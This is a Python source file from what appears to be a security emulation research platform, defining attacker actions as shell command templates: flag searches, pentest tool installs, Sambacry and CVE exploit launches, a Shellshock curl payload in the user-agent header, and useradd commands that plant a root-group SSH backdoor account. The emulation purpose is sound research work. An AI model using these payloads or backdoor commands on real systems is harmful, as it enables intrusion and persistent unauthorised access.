import csle_common.constants.constants as constants
from csle_common.dao.emulation_action.attacker.emulation_attacker_action import EmulationAttackerAction
from csle_common.dao.emulation_action.attacker.emulation_attacker_action_type import EmulationAttackerActionType
from csle_common.dao.emulation_action.attacker.emulation_attacker_action_id import EmulationAttackerActionId
from csle_common.dao.emulation_action.attacker.emulation_attacker_action_outcome import EmulationAttackerActionOutcome


class EmulationAttackerShellActions:
    """
    Class implementing regular Bash actions for the attacker (e.g. interacting with filesystem or OS) in the emulation
    """

    @staticmethod
    def FIND_FLAG(index: int) -> EmulationAttackerAction:
        """
        Searches through the file systems that have been compromised to find a flag

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.FIND_FLAG
        cmd = ["find / -name 'flag*.txt'  2>&1 | grep -v 'Permission denied'"]
        alt_cmd = ["find / | grep 'flag*'"]
        return EmulationAttackerAction(id=id, name="Find flag", cmds=cmd,
                                       type=EmulationAttackerActionType.POST_EXPLOIT,
                                       descr="Searches the file system for a flag",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.FLAG, alt_cmds=alt_cmd,
                                       backdoor=False)

    @staticmethod
    def INSTALL_TOOLS(index: int) -> EmulationAttackerAction:
        """
        Installs tools on compromised machines

        :param index: index of the machine to apply the action to
        :return: the created action
        """
        id = EmulationAttackerActionId.INSTALL_TOOLS
        cmd = ["sudo apt-get -y install nmap ssh git unzip lftp",
               "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip "
               "-O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && "
               "sudo mv SecLists-master /SecLists"]
        return EmulationAttackerAction(id=id, name="Install tools", cmds=cmd,
                                       type=EmulationAttackerActionType.POST_EXPLOIT,
                                       descr="If taken root on remote machine, installs pentest tools, e.g. nmap",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.PIVOTING, alt_cmds=None,
                                       backdoor=False)

    @staticmethod
    def SSH_BACKDOOR(index: int) -> EmulationAttackerAction:
        """
        Installs a SSH backdoor on a compromised machine

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.SSH_BACKDOOR
        cmd = ["sudo service ssh start", "sudo useradd -rm -d /home/{} -s /bin/bash -g root -G "
                                         "sudo -p \"$(openssl passwd -1 '{}')\" {}"]
        return EmulationAttackerAction(id=id, name="Install SSH backdoor", cmds=cmd,
                                       type=EmulationAttackerActionType.POST_EXPLOIT,
                                       descr="If taken root on remote machine, installs a ssh backdoor,"
                                             " useful for upgrading telnet"
                                             "or weaker channels",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.PIVOTING,
                                       alt_cmds=None,
                                       backdoor=True)

    @staticmethod
    def SAMBACRY_EXPLOIT(index: int) -> EmulationAttackerAction:
        """
        Launches the sambacry exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.SAMBACRY_EXPLOIT
        cmd = ["sudo /root/miniconda3/envs/samba/bin/python /samba_exploit.py -e /libbindshell-samba.so -s data "
               "-r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699 -t {}"]
        return EmulationAttackerAction(id=id, name="Sambacry Explolit", cmds=cmd,
                                       type=EmulationAttackerActionType.EXPLOIT,
                                       descr="Uses the sambacry shell to get remote code execution and "
                                             "then sets up a SSH backdoor to upgrade the channel",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
                                       alt_cmds=None,
                                       vulnerability=constants.SAMBA.VULNERABILITY_NAME,
                                       backdoor=True)

    @staticmethod
    def SHELLSHOCK_EXPLOIT(index: int) -> EmulationAttackerAction:
        """
        Launches the shellshock exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.SHELLSHOCK_EXPLOIT
        cmd = ["curl -H \"user-agent: () {{ :; }}; echo; echo; /bin/bash -c "
               "'sudo useradd -rm -d /home/{} -s /bin/bash -g root -G sudo "
               "-p $(openssl passwd -1 \'{}\') {}'\" http://{}:80/cgi-bin/vulnerable",
               "curl -H \"user-agent: () {{ :; }}; echo; echo; /bin/bash -c 'echo {}:{} | sudo /usr/sbin/chpasswd'\" "
               "http://{}:80/cgi-bin/vulnerable"
               ]
        return EmulationAttackerAction(id=id, name="ShellShock Explolit", cmds=cmd,
                                       type=EmulationAttackerActionType.EXPLOIT,
                                       descr="Uses the Shellshock exploit and curl to do "
                                             "remote code execution and create a backdoor",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
                                       alt_cmds=None,
                                       vulnerability=constants.SHELLSHOCK.VULNERABILITY_NAME,
                                       backdoor=True)

    @staticmethod
    def DVWA_SQL_INJECTION(index: int) -> EmulationAttackerAction:
        """
        Launches the  DVWA SQL Injection exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.DVWA_SQL_INJECTION
        cmd = ["/sql_injection_exploit.sh"]
        return EmulationAttackerAction(id=id, name="DVWA SQL Injection Exploit", cmds=cmd,
                                       type=EmulationAttackerActionType.EXPLOIT,
                                       descr="Uses the DVWA SQL Injection exploit to extract secret passwords",
                                       index=index,
                                       ips=[],
                                       action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS, alt_cmds=None,
                                       vulnerability=constants.DVWA_SQL_INJECTION.VULNERABILITY_NAME,
                                       backdoor=True)

    @staticmethod
    def CVE_2015_3306_EXPLOIT(index: int) -> EmulationAttackerAction:
        """
        Launches the CVE-2015-3306 exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.CVE_2015_3306_EXPLOIT
        cmd = ["sudo /root/miniconda3/bin/python3 /cve_2015_3306_exploit.py "
               "--port 21 --path '/var/www/html/' --host {}"]
        return EmulationAttackerAction(
            id=id, name="CVE-2015-3306 exploit", cmds=cmd, type=EmulationAttackerActionType.EXPLOIT,
            descr="Uses the CVE-2015-3306 vulnerability to get remote code execution and then sets up a SSH backdoor "
                  "to upgrade the channel", index=index, ips=[],
            action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS, alt_cmds=None,
            vulnerability=constants.CVE_2015_3306.VULNERABILITY_NAME, backdoor=True)

    @staticmethod
    def CVE_2015_1427_EXPLOIT(index: int) -> EmulationAttackerAction:
        """
        Launches the CVE-2015-1427 exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.CVE_2015_1427_EXPLOIT
        cmd = ["/cve_2015_1427_exploit.sh {}:9200"]
        return EmulationAttackerAction(
            id=id, name="CVE-2015-1427 exploit", cmds=cmd, type=EmulationAttackerActionType.EXPLOIT,
            descr="Uses the CVE-2015-1427 vulnerability to get remote code execution and then sets up a SSH backdoor "
                  "to upgrade the channel", index=index, ips=[],
            action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS, alt_cmds=None,
            vulnerability=constants.CVE_2015_1427.VULNERABILITY_NAME, backdoor=True)

    @staticmethod
    def CVE_2016_10033_EXPLOIT(index: int) -> EmulationAttackerAction:
        """
        Launches the CVE-2016-10033 exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.CVE_2016_10033_EXPLOIT
        cmd = ["/cve_2016_10033_exploit.sh {}:80"]
        return EmulationAttackerAction(id=id, name="CVE-2016-10033 exploit", cmds=cmd,
                                       type=EmulationAttackerActionType.EXPLOIT,
                                       descr="Uses the CVE-2016-10033 vulnerability to get remote "
                                             "code execution and then sets up a SSH backdoor "
                                             "to upgrade the channel",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
                                       alt_cmds=None,
                                       vulnerability=constants.CVE_2016_10033.VULNERABILITY_NAME,
                                       backdoor=True)

    @staticmethod
    def CVE_2010_0426_PRIV_ESC(index: int) -> EmulationAttackerAction:
        """
        Launches the CVE-2010-0426 exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.CVE_2010_0426_PRIV_ESC
        cmd = ["/cve_2010_0426_exploit.sh {}", "/create_backdoor_cve_2010_0426.sh"]
        return EmulationAttackerAction(id=id, name="CVE-2010-0426 exploit", cmds=cmd,
                                       type=EmulationAttackerActionType.PRIVILEGE_ESCALATION,
                                       descr="Uses the CVE-2010-0426 vulnerability to "
                                             "perform privilege escalation to get root access",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
                                       alt_cmds=None,
                                       vulnerability=constants.CVE_2010_0426.VULNERABILITY_NAME,
                                       backdoor=True)

    @staticmethod
    def CVE_2015_5602_PRIV_ESC(index: int) -> EmulationAttackerAction:
        """
        Launches the CVE-2015-5602 exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.CVE_2015_5602_PRIV_ESC
        cmd = ["/cve_2015_5602_exploit.sh", "su root", constants.CVE_2015_5602.ROOT_PW,
               "/create_backdoor_cve_2015_5602.sh"]
        return EmulationAttackerAction(id=id, name="CVE-2015-5602 exploit", cmds=cmd,
                                       type=EmulationAttackerActionType.PRIVILEGE_ESCALATION,
                                       descr="Uses the CVE-2015-5602 vulnerability to perform "
                                             "privilege escalation to get root access",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
                                       alt_cmds=None, vulnerability=constants.CVE_2015_5602.VULNERABILITY_NAME,
                                       backdoor=True)
